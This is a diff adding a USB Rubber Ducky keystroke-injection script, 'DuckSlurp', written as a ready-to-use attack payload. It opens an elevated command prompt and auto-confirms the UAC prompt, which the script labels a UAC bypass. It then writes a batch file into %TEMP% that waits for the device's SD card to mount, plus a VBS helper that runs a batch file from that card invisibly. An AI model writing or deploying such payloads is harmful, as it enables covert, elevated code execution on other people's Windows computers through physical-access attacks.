@@ -1,0 +1,83 @@
+REM Author: overwraith modified by dkitchen
+REM Name: DuckSlurp.txt
+REM Purpose: Run an executable file off of the SD card after it mounts. 
+REM Uses googleknowsbests slightly more portable method to find the "Ducky" drive. 
+REM Encoder V2.4
+REM Using the run command for a broader OS base. 
+
+REM *** Initial Delay *** 
+DELAY 2000
+
+REM *** Bypass UAC ***
+GUI r
+DELAY 250
+STRING powershell Start-Process cmd.exe -Verb runAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 500
+
+
+REM *** Change directories because System32 appears to be protected. ***
+STRING CD %TEMP%
+ENTER
+
+REM *** Delete wait batch file if already exists ***
+STRING erase /Q DuckyWait.bat
+ENTER
+
+REM *** Make batch file that waits for SD card to mount. ***
+STRING copy con DuckyWait.bat
+ENTER
+STRING :while1
+ENTER
+STRING @echo off
+ENTER
+STRING :while1
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
+ENTER
+STRING if [%DUCKYdrive%] EQU [] (
+ENTER
+STRING timeout /t 3
+ENTER
+STRING goto :while1 
+ENTER
+STRING ) else (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 3
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING set DUCKYdrive=%DUCKYdrive%\DuckSlurp\
+ENTER
+STRING wscript.exe invis.vbs %DUCKYdrive%\DuckSlurp.bat
+ENTER
+CONTROL z
+ENTER
+
+REM *** Delete Invisible vbs file if already exists ***
+STRING erase /Q invis.vbs
+ENTER
+
+REM *** Make VBS file to run invisibly ***
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL Z
+ENTER
+
+REM *** Run the batch file invisibly ***
+STRING wscript.exe invis.vbs DuckyWait.bat
+ENTER
+
+REM *** Exit ***
+STRING EXIT
+ENTER
